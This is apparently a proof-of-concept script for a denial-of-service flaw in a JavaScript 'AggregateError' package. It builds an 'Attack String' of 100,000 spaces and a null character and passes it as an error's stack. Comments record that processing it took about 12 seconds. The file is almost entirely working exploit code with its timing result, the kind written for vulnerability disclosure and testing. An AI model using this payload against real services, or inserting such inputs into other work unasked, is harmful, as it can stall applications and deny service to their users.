const AggregateError = require("./index.js");

//Attack String :""+" "*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += " ";
}
str += "\u0000";

const error = {
  message: "a",
  stack: str,
};
var aggregateError = new AggregateError([error]);

// real    0m12.439s
// user    0m12.413s
// sys     0m0.010s